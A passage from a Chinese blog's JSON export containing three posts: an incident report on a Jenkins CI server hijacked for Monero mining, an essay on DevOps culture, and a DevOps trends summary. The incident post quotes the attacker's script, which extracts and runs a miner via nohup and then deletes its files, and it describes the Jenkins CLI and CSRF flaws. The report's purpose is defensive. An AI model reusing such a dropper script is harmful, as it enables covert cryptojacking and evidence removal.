协议引发了我的好奇心，经过调查，这居然是一个叫做门罗币的加密虚拟币的矿池协议：\n门罗币****XMR一种使用CryptoNote协议的一个虚拟币币种，其并不是比特币的一个分支。CryptoNote在2012年已经开发出来，当年已有Bytecoin使用CrytoNote技术，XMR是在2014年开发出来，可以预见CryptoNote技术已经非常成熟，该技术通过数字环签名提供更好的匿名性。目前国内对该币种匿名技术宣传较少，国外知名度较高。Monero词语是引自于世界语，在世界语中的含义表示为货币。\n而矿池则是是比特币(Bitcoin)等P2P密码学虚拟货币开采所必须的基础设施，一般是对外开放的团队开采服务器，其存在意义为提升比特币开采稳定性，使矿工薪酬趋于稳定。\n假设100万人参与比特币挖矿，全网400P算力，其中90%的矿工为1P(1000T)以下的算力，如果投入一台1T矿机，将占全网算力的40万分之1，理论上平均每40万个10分钟能挖到一个区块，也就是7.6年才能挖到一个区块然后一次性拿到50个比特币。那么，假如我再找9个拥有1T算力矿机的矿工，达成协定，我们总共10个人，其中任何一个人挖到区块，都按照每人的算力占比来进行平分，那么我们就是一个整体，总共10T算力，那么平均0.76年即可挖到一个区块，然后算下来到我们手上的就是0.76年开采到5个比特币，如果组织100人、1000人、1万人甚至10万人呢？如果是10万人，那么平均100分钟就能挖到1个区块，作为团队的一份子，我的收入将会趋于稳定。这就是矿池的基本原理，即大家组队进行比特币开采，可以参考彩票中的合买。\n当然，以上只是对矿池的基本原理和性质进行简单的描述，实际情况会非常复杂。矿池是一个全自动的开采平台，即矿机接入矿池——提供算力——获得收益。\n抱着“大胆假设，小心求证”的心态，我们找到了配置文件中这家叫做crypyto-pool的网站https://monero.crypto-pool.fr/它是一个著名门罗币的矿池网站。而通过配置文件的用户名，我们看到了这个程序的挖矿记录和转账记录。根据6月份的交易数据以及对应牌价，截止作者发稿时，该程序已 为作者赚取了 1165.64 美元的收益。\n而接下来的代码间接暴露了证据：\n代码片段 3:\n1 2 3 4 5 6 7 8 dd if=/tmp/conn skip=7664 bs=1 of=/tmp/donns chmod +x /tmp/donns nohup /tmp/donns -B -c /tmp/config.conf \\\u0026gt;/dev/null 2\\\u0026gt;\u0026amp;1 \u0026amp; rm -rf /tmp/config.conf rm -rf /tmp/conn rm -rf /tmp/conns rm -f /tmp/bonn.sh 这段脚本不光执行了程序，并且删除了执行后的相关文件记录。确认了是挖矿进程之后，我们果断的停止了进程，并且把对应的环境制作成了临时镜像以便做进一步分析。\n以上，我们仅仅通过一系列调查证明了 donns 进程具有挖门罗币的功能。然而，我们很难知道它是否做了别的事情。比如把 CI 上的关键信息发送出去，后果则不堪设想……\n那么问题来了，这段脚本是如何进入CI的 #通过网上搜索相关线索（https://groups.google.com/forum/#!topic/jenkinsci-advisories/sN9S0x78kMU），这个脚本最早是2016年11月11日发现的，最早是一个叫做kwwoker32的进程，脚本很相似。从脚本来看，经历了conns, bonns两代的演化之后，这应该是第三代挖矿脚本了。从脚本来看，donns和bonns和conns是竞争关系，因此执行之前要把它俩先强制终止并清除。它们所采用的应该是同一个漏洞。\n这个漏洞存在于Jenkins CLI，这是一个用Java编写的命令行工具，可以通过命令行远程操作Jenkins来执行很多操作。在这个例子中，攻击者通过这个工具向Jenkins服务器传送一个序列化的对象连接到攻击者的LDAP服务器，以此绕过Jenkins自身保护机制并且远程执行代码。\n修复方法是手动修改Jenkins的执行脚本，关闭CLI这个选项（默认是打开的）。\n而在今年的4月26日，又修复了一大批通过 跨站请求伪造(Cross Site Request Forgery)远程执行代码的漏洞。\n跨站请求伪造（Cross-Site Request Forgery） 在OWASP Top 10 里排在 A8，是常见的攻击类型。CSRF攻击原理比较简单，如下图所示：\nJenkins 的 跨站请求伪造（CSRF）攻击 #1.管理员打开浏览器，并输入用户名和密码请求登录Jenkins；\n2.在用户信息通过验证后，Jenkins产生Cookie信息并返回给浏览器，此时管理员登录Jenkins成功，可以正常发送请求到Jenkins；\n3.用户未退出Jenkins之前，在同一浏览器中，打开一个TAB页访问恶意网站；\n4.在恶意网站接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问Jenkins；\n5.浏览器在接收到这些攻击性代码后，根据存在恶意代码的网站的请求，在用户不知情的情况下携带Cookie信息，向Jenkins发出请求。Jenkins并不知道该请求其实是由恶意网站发起的，所以会根据用户的Cookie信息中的权限处理该请求，导致来自恶意网站的恶意代码被执行。\n简而言之，任何一个拥有 Jenkins 权限的管理员，如果在企业网络内部，同时访问 Jenkins 以及存在攻击脚本的第三方网页，攻击脚本就会伪造请求并利用漏洞进行攻击。\n当发现这样的事故时，我们是怎么做的 #处理运维事故就像在手术室抢救重症病患一样，最大对手除了问题本身，就是时间，要在最快的速度里减少损失，并且要留下足够的信息便于追查。\n而在处理这次事故的时候，我们采取了如下措施：\n及时切断网络而不是终止程序，避免更多的泄露。也许你停止了进程的同时，进程也会销毁一切记录，不利于事后排查。 快速构建虚拟机镜像，保留现场。（这通常需要一些外部资源支持。如果你没有这个条件，保持服务器只有有限的网络访问权限。） 记录下整个发现的过程，最好能够通过终端软件实时截图。或者采用 script命令录制过程。 及时保留相关连的第三方系统的访问日志。 找出这台服务器上所有的 口令，秘钥等，并立即更换。 终端其它 CI 服务器的运作，并立即进行安全排查。 采用更严格的黑白名单，限制网络的访问，对应用的访问进行隔离。 通过这一次攻击，我们学到了什么 #本次攻击给运维人员的启示 #可执行（executeble）的东西往往都是安全隐患的重灾区，尤其是未经授权的执行。\n浏览器是需要防范的第一关，因为浏览器会：1. 访问外部资源，2.自动执行来源不明的脚本。而这些脚本对用户来说是不透明的，这就为很多潜在的 跨站请求伪造 便利用了这样一个契机。因此，内外网络分离，限制可公开访问的内容，建立访问黑白名单制度，非常重要。如果持续集成服务器实现了内外网完全隔离，采用跳板机并限制 Jenkins 对外访问，这次的攻击完全可以避免。\n在 避免CI成为一个安全隐患一文中，由于 CI 具有自动执行任务的能力。因此，它会成为一个重大的安全隐患。而这次事件恰恰 又验证了“漏洞墨菲定律”：只要漏洞有可能被利用，则一定会被利用。\nJenkins是一款开源软件，代码对公众的开放，同时也把漏洞开放给了所有人。因此，需要对开源软件进行更加严格的安全控制和监控，而不能因噎废食，彻底抛弃开源软件，走向另一个极端。\n那么，如何安全的使用开源软件 # 来源可靠：软件包来源应当可靠，最好能通过 MD5 Sum 校验。\n权限受限：在受限的权限和隔离区下使用软件。\n执行可控：运行环境或者网络隔，使之运行在沙箱里，降低影响范围。\n无状态化：定期销毁运行实例，并且进行重启，更新访问权限信息，例如密码或 token，避免权限滥用。\n在 DevOps 的实践中，往往会通过自动化执行一些任务带来便利。然而，易用性和安全性往往很难兼得，在自动化的过程中，一定要考虑到其中可能产生安全隐患并且最大程度的限制可执行资源的访问。\n本次攻击给 开发人员的启示 #跨站请求伪造是很常见的安全漏洞，对于 Web 应用开发人员而言，往往会因为某些便利性的设计给站点带来隐患。尤其是 REST API的设计，如果没有添加对应的权限验证，往往会成为跨站请求伪造的目标。虽然多一步验证会影响用户体验，但安全仍然是不能够 Trade-Off 的内容之一。不要为了采取便利的方案留下了很深的安全隐患。创建漏洞往往来源于不小心，而找到漏洞则需要花费更大的周折。采用一些通用的安全实践，往往会得到更好的效果。\n关于更多的跨站请求伪造如何防御的信息请参考：\nTop 10 2013-A8-Cross-Site Request Forgery (CSRF) -OWASP\n[科普]跨站请求伪造-CSRF防护方法 - FreeBuf.COM |关注黑客与极客\n此外，通过对象传递，利用 Java 接口的特性，攻击者可以自由改写方法的实现。从而达到远程执行代码的目的，Jenkins CLI 的漏洞就来源于此，在代码设计时如果缺乏足够的验证和异常捕获，攻击代码就可以通过异常绕过验证并直接执行。因此，传递对象如果包含可执行的内容，一定要非常小心。如果要传递序列化的对象，在反序列化的时候一定要进行足够的验证。\n还是那句话，如果没有这些如果 #攻击者的手段是层出不穷的，因此安全不单单是运维或是开发的问题，它是一个问题体系。DevOps 团队一定要有安全內建（Build Security In）的意识。从工作流程，安全实践和安全仪式上进行全方位的评估和学习，请不要把安全当做是阻碍，它是保护你和大家的最好手段。\n","date":"June 28, 2017","permalink":"/blog/2017/2017-06-28-are-your-ci-mining/","section":"Blogs","summary":"","title":"你的 CI 在挖矿吗？"},{"content":"","date":null,"permalink":"/tags/devops-%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F/","section":"Tags","summary":"","title":"DevOps 前世今生"},{"content":"用工具堆砌的DevOps 幻觉 #在第一届 DevOpsDays结束后，DevOps 运动则如星火燎原之势在全球发展开来。随着 DevOps 思想的不断传播，相对的质疑和批评也从未停止过。以至于到今天对于 DevOps 的定义还是众说纷纭，争论不休。\n当人们还在争论 DevOps的时候，一批基于敏捷的工程实践和自动化工具带着 DevOps 的标签走入了人们的视野。人们开始认为 DevOps 就是使用这些工具进行自动化。\n在早期的 DevOps 实践里，开发和运维仍然是分离的。而在很多企业中，运维部门往往是核心部门，评审应用软件的架构设计和上线要求。于是运维部门开始利用这些被称作为“DevOps”的自动化工具管理设备和应用系统。并且将自己相关的实践打赏了“DevOps”的标签传播开来。\n于此同时，开发团队开始采用这些工具构建开发用的测试环境。并将运维需求带入了开发流程中，这促进了內建质量。并且利用持续集成服务器（Continous Integration Serever） 构建持续交付流水线（Continuous delivery pipeline）来可视化软件交付的进度和流程，并通过流水线完成了自动化部署。持续集成服务器连接了开发和运维！\n这就是DevOps ？\n“同床异梦” 的 DevOps #虽然开发团队和运维团队使用的工具变了，然而事情却没有改变：我们仍然能看到”流程结合在一起，但工作目标仍然分离“的两个团队：运维团队仍然牢牢控制着环境，控制着上线标准和上线流程。通过补充更多自动化的测试和验证手段构建更加严格的控制着变更的入口和出口。开发团队仍然不停的为了满足运维团队制定的更加严格的开发规范更加努力的学习各种工具而不断加班。\n运维团队仍然不关心开发团队是否需要帮助，开发团队也依然不了解运维团队在做什么。如果没有 DevOps文化的建立，DevOps 仅仅是“通过自动化工具和手段构建的标准流程”而已。\n有人甚至开始把这两个团队融合在了一起，变成了一个团队。这在一定程度上缓解了这种矛盾，但是相互指责却并没有让团队凝聚起来更加具有战斗力。而是变成了一个缓慢而争论不休的“Dev和Ops 法庭”：项目经理或者产品经理成为了法官，Dev 和 Ops 则轮番成为原告和被告。\n这不是 DevOps !\n早期的 DevOps文化：信任和尊重 #早在 “10+ Deploys Per Day: Dev and Ops Cooperation at Flickr” 的演讲里，就总结出了 Dev 和 Ops 的合作并不能仅仅只有工具，还需要依托文化把某些行为和价值观带到组织内部。这个演讲很有洞见的总结了 Dev 和 Ops 的不同观点和思维模式，并从 Dev 和 Ops 的立场分别给出了促进合作的建议。这其中包括：\n尊重：避免成见并尊重他人的经验，观点和责任。不要只是一味的拒绝改变，或者把隐藏细节。对于Dev 来说，当和 Ops 交流的时候，则应该告诉代码对 Ops 工作的影响。\n信任：对于 Ops 来说，他们应该相信 Dev 新增加的功能。对于 Dev 来说，他们 应该相信 Ops对基础设施的改动，而且每个人都应该相信对方已经做到最好。 Ops 应该更加透明，不光需要分享运行指南和故障预案，而且还要给 Dev 能够访问机器的权限。\n对失败的健康态度：尽管经过层层严格的测试，失败在很多情况下是无法避免的。但如果能像飞机的安全说明那样制定出应急预案，则可以在失败后尽可能的减少损失。\n避免指责：指责会把大量的时间花在问题责任的界定而非问题的解决上。对于 Dev 来说，他们需要时刻记得当他们写下的 代码搞砸了之后，总会有 Ops 半夜第一个被叫醒去解决问题。而对于 Ops 来说，需要给当前的状况有建设性的建议和反馈，而不仅仅是抱怨和指责 。\n缺失的 DevOps文化建设 —— 用技术升级粉饰制度问题 #在很多管理层看来，这些不可思议的做法颠覆了经典的运维管理经验，看起来很美好而往往和现有的制度存在冲突而难以落地。另一方面，工程师却很向往这样一种梦想的工作环境，可以摆脱那些无意义争斗和约束，做真正有意义的事情。\n而在一个对变革抵触，对冒险和失败不宽容的环境下，人们往往倾向于不作为，让事情不断变坏。并寄希望于管理人员。而在这种制度下，管理人员往往倾向于做表面文章，相较于改变现有的制度和习惯，购买技术是最方便，效果最明显，风险最低的手段，这会让一切”看起来很美好“。\n而在 DevOps 改进中，技术往往是最容易的部分，只要找到供应商或解决方案提供商购买就可以了。然而这并没有解决组织的冲突，只是突击的偿还了一部分技术债务而已。技术仍然是被用来粉饰制度问题的“修正液“。\n当你有了 DevOps文化的团队，你无需担心技术水平。因为这样的团队会找到最合适的工具完成目标。但是你拥有了 DevOps 的工具，得到的则是提高效率的组织孤岛。\nNetflix就是这样一个例子，Netflix是全球十大视频网站中唯一的收费站点。 尽管仍落后于YouTube和 Hulu 等在线视频巨头，但Netflix的发展速度远远高于竞争对手。此外，Netflix 在微服务和 DevOps 的实践上一直走在业界的前沿。\n早在2009年， Netflix 的 CEO 和首席人才官就做了一份127页的PPT，命名为《自由\u0026amp;责任的文化》，这份PPT在网上被查阅超过了600万次，甚至被Facebook公司的COO桑德伯格称为“硅谷最重要的文件”。\n这份 PPT 说明了一个重要的问题，保持领先的关键不在于你是否拥有先进的技术（很多技术一开始都没有，都是 Netflix 的员工自己创造），最优秀的员工（很多员工都是其它公司的普通员工），而在于你是否拥有可以留住人才和发挥人才价值的制度。\nDevOps 文化的特征 #那么，DevOps的文化看起来应该是什么样的呢？\n在 Martin Fowler 的博客上，Rouan Wilsenach则作为一个观察者进一步从外部特征上描述了DevOps文化。他认为DevOps文化的主要特征是\u0026quot;增加了开发和运维的合作\u0026quot;，为了支持这种合作的发生，需要在团队内部的文化和企业组织的文化上进行两方面的调整。如下图所示：\n责任共担（Shared Responsibility） #从团队内部讲，责任共担而不是 责任划分的制度会鼓励合作的发生。责任边界清晰，每个人都倾向于做好分内事，而不会关心工作流上游或者是工作流下游里别人的事。\n如果开发团队无需对系统上线后的维护和负责人，他们自然对运维没有兴趣。只有让开发团队全程介入整个开发到运维的流程，他们才能对运维的痛点感同身受，在开发过程中加入对运维的考量。此外，开发团队还会从对生产环境的监控中发现新的需求。\n如果运维团队分担开发团队的业务目标和责任，他们就会更加理解开发团队对运维的要求并且和开发团队工作的更加紧密。然而在实践中，合作经常起始于 Dev 产生的产品运维意识（例如部署和监控），以及在开发过程向运维团队中学习到的实践和自动化工具。\n没有组织孤岛（No Silos） #从组织方面讲，在开发和运维之间没有孤岛（No Silos)是组织调整的必要。适当的调整资源的结构，让运维的同事在早期就加入团队并一起工作对构建合作的文化是非常有帮助的。而“交接”和“审批”并不是一个责任共担的工作方式。这不会导致开发团队和运维团队合作，反而会引起指责的文化。所以，开发和运维的团队必须都要对系统变更的成败负责。当然，这无可避免的会导致开发和运维的分界线会越来越模糊。\n一个常见的反模式就是“分离的 DevOps 团队”，它一方面创造了新的孤岛，另一方面组织了 DevOps 文化在整个组织内的传播。\n自治的团队（Autonomous teams） #组织另外一个极具价值的转变是自治团队 （Autonomous teams），为了让开发团队和运维团队工作的更有效率，需要让团队能够直接处理变革而不是经过错综复杂的决策过程。这需要信任团队，改变风险管理的方式并创建一个对失败相对宽容的环境。\n质量內建于开发流程中（building quality into the development process） #DevOps文化的转变带来的一个效果是让新代码进入生产环境更加容易。这使一些未来的 DevOps 文化转变非常必要。为了确保生产环境的变更稳妥。团队需要重视“将质量构建在开发过程中”，这包括很多跨功能的考虑例如性能和安全，持续交付和自我测试的代码会形成一个允许频繁且低风险部署的基础。\n反馈（Feedback) #团队也要重视反馈，为了持续改进， Dev和 Ops 就像系统自身一样，紧密的工作在一起。产品环境的监控是一个对于诊断错误和曝光潜在改进的非常有帮助的反馈环。\n自动化（Automation） #自动化是 DevOps 运动以及促进合作的基石。将测试、配置和部署自动化可以让人们释放出更多的精力，并专注于更有价值的活动，此外还能减少人为失误。而且，自动化脚本和自动化测试可以成为一个活文档，实时跟踪在线系统配置的变更历史。举个例子，通过自动化的服务器配置可以避免在雪花服务器上排除故障和解决问题的工作量浪费。这意味着 Dev 和 Ops 同样可以理解一个服务器的变更是如何配置的了。\n营造 DevOps的文化：奖励持续的“改进冒险” # “你无法直接改变文化，但你可以改变行为，行为会变成文化。”\n以上一切的发生，都需要从组织内部做出改进。但每个组织有每个组织的特性，改进的方式和方法也不一样。在这样一个变动而开放的时代，没有什么是绝对正确的。每一个改进的尝试都是一场“改进冒险“。\n在冒险中，失败并不可怕，可怕的是失去了继续改进的动力。所以我们要鼓励”改进冒险“的行为。\n在很多组织中，变革的动力往往来自于上层的压力。而在集权的组织中，一切权力都属于上级管理者。一切权力都属于上级管理者的另外一个意思就是一切责任也都由上级承担。这样会在组织内出现一个“承担高风险和责任”的个人，而非共同分散风险的团队。这是一个脆弱的组织结构，而在这样一个结构下，往往会出现管理人员短视的投机行为，而给整体企业带来更大的风险。\n而DevOps不仅仅能通过技术手段降低变更的风险，更是构造一系列的实践和制度来分散这种因高度集中化和集权化所带来的风险。\n首先就是要充分给团队授权，让团队能够在有限的风险控制中开展改进。改进是不断小步进行的，如果步子太大，往往适得其反。\n其次，就是要有明确的目标和度量方法。“没有度量，改进就无从谈起”，改进之前，一定要设定好度量指标。以跟踪并收集相关的数据。\n最后，无论成功还是失败，都需要有产出，让团队通过自我激励的方式持续形成凝聚力。而不要因为一次的失败就全盘否定改进。如同上文提到的，在一个对失败不宽容的文化氛围中。相较于承担风险的改进尝试，人们往往倾向于不作为。\n但是，对失败宽容并不意味着不需要为失败承担责任。而是要要从失败中学习到经验，向成功的目标不断的努力。进行下一场“改进冒险”。成功很可能是巧合，但失败必然有原因，避免了那些失败的原因，就有很大的机会走向成功。\n营造 DevOps文化的几点提示 #文化的改变是困难的，这并不是一个一蹴而就的行为，需要长期不断坚持才会有效果。而带来的收益非常值得。\n“文化是你奖励和惩罚的行为”，要对那些符合 DevOps 文化的行为给予奖励，对于那些违反 DevOps 给予一定的警告或处罚。\n以好的出发点推测人的行为而不是坏的出发点，这会破坏信任。 经常质疑制度是否有问题，而不是质疑人是否有问题。有问题的行为一定是有问题的制度造成的。 不要吝惜你的表扬和赞美，但请保管好你的刻薄，指责和冷嘲热讽。 对失败的宽容是强调反思和学习，而不是惩罚。 多想想自己能为他人做什么，而不是要求别人做什么。 集体庆祝每一个成功，集体反思每一个失败。 DevOps文化落地很难，但是收益巨大。你仍然愿意去做吗？\n参考 #https://martinfowler.com/bliki/DevOpsCulture.html\nhttp://itrevolution.com/devops-culture-part-1/\nhttp://itrevolution.com/devops-culture-part-2/\nhttps://blog.chef.io/2010/07/16/what-devops-means-to-me/\nhttp://www.lieyunwang.com/archives/105338\nhttps://theagileadmin.com/what-is-devops/\nhttp://www.jedi.be/blog/2012/05/12/codifying-devops-area-practices/\nhttp://radify.io/blog/four-principles-of-devops/\nhttps://dzone.com/articles/devops-devops-principles\nhttps://devops.com/interconnect-2016-culture-matters/\nhttps://jocelyngoldfein.com/culture-is-the-behavior-you-reward-and-punish-7e8e75c6543e#.lw8glaksp\nhttps://pt.slideshare.net/jezhumble/devops-and-agile-release-management\n","date":"May 21, 2017","permalink":"/blog/2017/2017-05-21-devops-culture/","section":"Blogs","summary":"","title":"DevOps前世今生 - 4. DevOps 的文化"},{"content":"DevOps 包含了太多方面的技术和实践，很难通过一个统一的工具链来描述其发展。即便如此，我们仍然可以从 ThoughtWorks 技术雷达的条目变动中看出一些趋势。今年，我有幸作为主编参与了最新一期技术雷达的翻译，作为 DevOps 的爱好者，十分高兴能在这一过程中看到 DevOps 未来发展的几个趋势，总结成了这篇文章。\n趋势1：微服务目前仍然是 DevOps 技术应用和发展的主要领域 #微服务将单块应用系统切割为多个简单独立的应用。从技术上说，这是通过工具把应用程序的内部复杂度转化为外部复杂度，需要一系列工具支撑微服务本身以及服务之间的通信。从组织上说，微服务团队要满足“快速发布，独立部署”的能力，则必须具备 DevOps 的工作方式。\n如何拆解微服务一直是微服务技术应用的最大难点之一，领域驱动设计是比较理想的微服务拆解方法论。社会化代码分析帮助团队通过更精确的数据找到更加合适的拆分点。CodeScene是一个在线服务，它能帮助识别出热点和复杂且难以维护的子系统，通过分析分布式子系统在时间上的耦合发现子系统之间的耦合。此外，它还能帮你认识组织中的康威定律，这会大大降低微服务解耦的难度。\n此外，微服务系统本质上是一个分布式系统，分布式系统之间的通信一直是很重要的问题。本期介绍的Kafka Streams和OpenTracing就是这类技术的条目。Kafka 作为一个成熟的分布式消息系统已经被广泛采用，而 Kafka Streams 则将最佳实践以“库”的方式呈现给开发人员，使得操作 Kafka 更加自然和简单。而 OpenTracing 则弥补了跨越多个微服务之间请求追踪的空白。\n另一方面，**无服务器风格的架构（Serverless architecture ）**把 DevOps 技术在微服务领域的应用推向极致。当应用程序执行环境的管理被新的编程模型和平台取代后，团队的交付生产率得到了进一步的提升。一方面它免去了很多环境管理的工作，包括设备、网络、主机以及对应的软件和配置工作，使得软件运行时环境更加稳定。另一方面，它大大降低了团队采用 DevOps 的技术门槛。然而，端到端的交付以及微服务中的函数管理问题日渐突出，尽管AWS API gateway和AWS Lambda几乎成了 Serverless 架构的代名词，但这二者结合的开发者体验并不佳。于是出现了Serverless framework和CLAUDIA这样的管理工具。\nAWS Lambda 带来的优势也深深影响了企业级应用领域，Apache OpenWhisk就是企业级无服务器领域的选择之一，它使得企业级应用也可以采用无服务器风格的架构构建应用程序。\n在微服务端到端交付流程上，Netflix 开源了自家的Spinnaker，Netflix 作为微服务实践的先锋，不断推出新的开源工具来弥补社区中微服务技术和最佳实践的缺失。 而Spring Cloud则为开发者提供了一系列工具，以便他们在所熟悉的 Spring 技术栈下使用这些服务协调技术(coordination techniques)，如服务发现、负载均衡、熔断和健康检查。\n而在微服务的安全上，最常见的需求之一是通过身份验证和授权功能来保护服务或 API。 这部分功能往往是最重要且不断重复构造的。而Keycloak就是一个开源的身份和访问管理解决方案，用于确保应用程序或微服务的安全。且几乎不需要编写代码，开箱即用。它支持单点登录，社交网络登录和标准协议登录(如 OpenID Connect ， OAuth2 和 SAML 等)。\n趋势2：以 Docker 为核心的数据中心方案逐渐走向成熟 #在过去的两年，Docker 社区有了突飞猛进的发展，似乎每期技术雷达都会出现 Docker 相关的条目。而 Docker 往往和 DevOps 联系起来，被认为是推动 DevOps 发展的杀手级工具，以至于有些人会以团队是否采用 Docker 作为团队是否具备 DevOps 能力的标志。\n而这一社区的创新数量则日渐平缓。一方面，开源社区激烈的竞争淘汰了一部分技术。另一方面，以 Docker 为中心的完整数据中心解决方案在不断的整合开源社区的零散工具并形成最佳实践。为端到端的开发和运维提供更完整的交付体验，各大厂商也相继开始推广自己的企业级整体收费解决方案，这表明 Docker 的使用已经走向成熟。\n在本期的技术雷达里的条目中出现了Mesosphere DC/OS，这是构建统一技术栈数据中心的一个征兆。在这方面Docker EE和Rancher都是非常有力的竞争者。根据我的判断，在未来的 Docker 社区里，统一容器化数据中心的竞争者将会进一步减少。而之前的私有云方案则慢慢会被“以 Docker 为核心数据中心级全栈交付”取代。\n趋势3：不完整的 DevOps 实践阻碍着 DevOps 的发展 #很遗憾看到单一持续集成实例和不完整的持续集成（CI Theatre）这样的条目出现在技术雷达里。可以感到企业应用 DevOps 技术的紧迫性。这同时也暴露了 DevOps 领域里“缺乏门槛较低且成熟的 DevOps 实践”的问题。\n大部分企业在 DevOps 转型中仅仅关注到了工具的升级。却忽视了价值流、生产流程中各个活动中的最佳实践以及 DevOps 团队文化的构建，这会使团队陷入 “已经完成 DevOps 转型的假象 ”，而停止了团队的自我改进。\nDevOps 的实践包含组织改进和技术升级两个部分，技术往往是最容易的部分。而缺乏组织改进的技术提升往往很难给组织带来质的飞跃。具备 DevOps 文化的团队则会不断反思和学习，通过共担责任和相互合作不断完善组织的 DevOps 实践。\n趋势4：领域特定的 DevOps 实践开始出现 #DevOps 的最早实践来自于互联网企业的 Web 应用，相应的思想被引入企业级应用并促进了一系列工具的发展。虽然并不是每一种应用软件交付形式都适合 DevOps，但随着 DevOps 的工具不断成熟。其它领域的 DevOps 实践也开始尝试借鉴 Web 应用领域的自动化工具，并逐渐形成领域级的 DevOps 实践。\n在人工智能领域，TensorFlow就是这样一个例子，它可以有多种 DevOps 友好的安装和部署方式 ，例如采用 Docker 进行部署。\n在区块链领域，超级账本(HYPERLEDGER) 就是这样一个例子，它提供了一套工具和服务，结合 DevOps 相关技术和实践形成了一个完整的解决方案。\n随着 DevOps 相关概念和技术不断向各个产业领域的深入发展，可以看到 DevOps 技术和实践带来的巨大影响力。然而，每个技术领域都有自己所关注的特性，并不是以往的 DevOps 实践可以全覆盖到的，这恰恰成为了 DevOps 技术和实践发展的契机。我很期待领域特定的 DevOps 技术实践给 DevOps 带来的发展。\n趋势5：采用 DevOps 进行技术债务重组和技术资产管理 #技术债务类似于金融债务，它也会产生利息，这里的利息其实就是指由于鲁莽的设计决策导致需要在未来的开发中付出更多的努力。投资银行业往往采用多种金融工具组合的方式来处理企业的不良债务。而清理技术债务的实践和工具却乏善可陈。\n技术债务不光阻碍了企业通过新技术带来便利，还使企业偿还技术债务所承担的成本越来越高，例如技术人才的流失，技术利息等综合性风险。\n虽然极少会出现企业因技术债务而走向衰败的案例，但新晋企业凭借新技术和商业模式颠覆传统行业并夺取市场份额的报道却不断发生。这从另一方面说明技术债务综合提升了采用新技术的机会成本，使企业不断失去创新和领先的巨大潜力。\nDevOps 技术栈的多元化为分散遗留系统技术债务风险提供了一套灵活而又低风险的工具和方法论。不断帮助企业从遗留系统的负担中解脱出来。\n而微服务则是首先通过领域拆分技术债，并用相应工具重组技术债。分离优质技术资产和不良资产，通过分散风险来降低抛弃成本。而将API 当做产品(APIs as a product)可以从一个全新的演进视角去看待技术债，通过可用性测试和用户体验研究帮企业剥离出技术债务中的优质资产和不良资产。\n另一方面，本期技术雷达中出现了封装遗留系统这样的实践，它往往配合着 Vagrant ， Packer 和 Docker 这样的工具一起使用。一方面它将技术债务的风险进行了隔离，另一方面它防止了遗留系统上产生的技术债利息的增长。\n趋势6：安全成为推动 DevOps 全面发展的重要力量 #安全是 DevOps 永远绕不开的话题，也往往是新技术在传统行业（例如金融和电信）应用中的最大阻碍。一方面，组织结构的转型迫使企业要打破原先的部门墙，这意味着很多原先的控制流程不再适用。另一方面，由于大量的 DevOps 技术来源于开源社区，缺乏强大技术实力的企业在应用相关技术时不免会有所担忧。\n从代码中解耦秘密信息的管理则让我们避开了一些开发过程中可能会产生的安全隐患。采用git-crypt这样的工具可以帮我们保证在开发的过程中源代码内部的信息安全。而采用HashiCorp Vault则提供了脱离应用程序代码的秘密信息存储机制，使得应用在运行过程中的秘密得到了有效保护。\nLinux Security Module 则一直在技术雷达的“采用”区域，通过 SELinux 和 AppArmor 这样的 LSM 兼容帮助团队评估谁可以访问共享主机上的哪些资源(包括其中的服务)。这种保守的访问管理方法将帮助团队在其SDLC流程中建立更好的安全性。以往这是 Ops 团队需要考虑的问题，而对 DevOps 的团队来说，这是每一个人的事情。\n“合规性即代码”（Compliance as Code） 是继“基础设施即代码”，“流水线即代码”之后的又一种自动化尝试。InSpec作为合规性即代码的提出者和实现者，通过自动化手段确保服务器在部署后的运维生命周期中依然保持安全与合规。它所带来的意义在于将规范制度代码化，得到了确定性的结果和解释。\n在不远的将来，不难想象人们所面对的法律和法规规定不再是一堆会导致歧义的语言文字条目，而是一组由自动化测试构成的测试环境。\n安全性和易用性往往被认为是鱼与熊掌不可兼得的两个方面。在 DevOps 之前，团队吞吐量和系统稳定性指标曾经也面临这样的境遇，然而 DevOps 使得二者可以兼得。同样我也有信心看到在未来 DevOps 的领域里，更多易用且安全的工具将会不断出现。在降低 DevOps 所带来的安全风险的同时，也提升团队开发过程的顺畅性和用户便利性。\n趋势7：Windows Server 和 .NET平台下的 DevOps 技术潜力巨大 #长期以来，Windows 和 .NET平台下的 DevOps 一直都是一个被低估的领域。一方面，社区缺乏对 Windows Server 平台的兴趣。另一方面，Windows Server 却有接近 90% 的市场占用率，在 Web 服务器领域则有33.5% 的市场占有率。\n有充足理由证明这是一个潜力巨大的市场。 我们看到了CAKE 和 FAKE这样的条目，作为 .NET 平台下替代 MSBuild 的构建解决方案， 它增强了 .NET 平台自动化方面的能力。而HANGFIRE则提供了更易用和灵活的自动化进程调度框架。我很期待未来有更多 Windows Server 和 .NET 平台 领域的创新。不久前，Docker 已经可以在 Windows 下运行。可以预见到，Windows Server 和 .NET 平台将会是下一阶段 DevOps 技术实践中值得深入发掘的领域。\n趋势8：非功能性自动化测试工具的逐渐完备 #技术能力高低的重要指标，尤其是针对生产环境应用程序的非功能性自动化测试工具。一直以来，技术雷达都在尝试从不同的角度宣扬自动化测试的重要性，从软件的开发阶段延展到了整个应用生命周期甚至整体 IT 资产的管理上。\n这期的技术雷达仍然关注了非功能性自动化测试，TestInfra 是 ServerSpec 的 Python 实现，它使得用Pytest测试基础设施成为可能。而MOLECULE旨在帮助开发和测试 Ansible 的 Role 。通过 在虚拟机或容器上为正在运行的 Ansible Role 测试构建脚手架，无需再手工创建这些测试环境。 正如技术雷达所说的：“虽然这是一个相当年轻的项目，但我们看到了其蕴含的巨大潜力。”\n趋势9：Python 成为 DevOps 工作中采用的首要编程语言 #早在 DevOps 刚刚开始盛行的时候，Python 就是一个被寄予厚望的语言，因为大部分 DevOps 工具和实践都需要用到 Python。虽然也有人尝试用 Ruby 或者 NodeJS 构建 DevOps 工具，然而都没有 Python 所构建的工具流行。与此同时，仍然不断有人把其它语言下编写的工具转化为 Python 的版本，TestInfra 就是这样一个例子。\n随着 Python 在大数据、人工智能、区块链、微服务以及 Docker 中的发展，可以预见 Python 在日后的领域仍然会发挥重要的作用。\n以上对 DevOps 趋势的解读仅为个人观点，如有不当之处还望指出，关于更多技术在技术\n雷达中的使用建议请参考https://www.thoughtworks.com/radar/a-z。\n","date":"May 2, 